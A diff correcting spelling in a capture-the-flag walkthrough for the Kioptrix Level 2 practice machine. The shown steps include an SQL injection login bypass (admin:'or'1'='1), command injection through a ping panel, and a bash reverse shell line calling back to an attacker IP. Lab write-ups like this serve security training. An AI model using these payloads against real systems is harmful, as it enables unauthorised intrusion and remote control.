@@ -1,11 +1,13 @@
 # Kioptrix-level-2-Walk-through
 
 
-### download the machine from 
+### download the machine from  https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
+
+and make sure that you downloaded the fixed version not the bugged one 
 
 then launch using VMware 
 
-no credintial are provided 
+no credential are provided 
 
 
 Notes :
@@ -31,15 +33,15 @@ found some open ports ( 22-80-111,443)
   
 now lets walkthrough each port and see what we can do (separately and combined):
 ----
-couldn't verfy that any service is vulnarble so i've move to surf the web server 
+couldn't verify that any service is vulnerable so I've move to surf the web server 
 
 well there is a login page , viewing the source code gives me hint to login as admin 
 
-trying basics credintial like admin:admin and admin:password  not working 
+trying basics credential like admin:admin and admin:password  not working 
 
 but a login page is a sign of sqli
 
-so i've tried admin:'
+so I've tried admin:'
 
 but no errors are displayed
 
@@ -47,17 +49,17 @@ try admin:'or'1'='1 as the simplest method of sqli
 
 and iam in and there is admin panel for pining local host 
 
-agood sign of command injection 
+a good sign of command injection 
 
-so i've tryed ;ls and the command worked 
+so I've tried ;ls and the command worked 
 
-now we get our shell by listening with our machin and inject this command to the admin pannel 
+now we get our shell by listening with our machine and inject this command to the admin panel 
 
 ; bash -i >& /dev/tcp/192.168.0.19/443 0>&1
 
 now we've got user shell 
 
-attemping a priv escilation 
+attempting a priv escalation 
 
 1- try sudo -l : failed
 
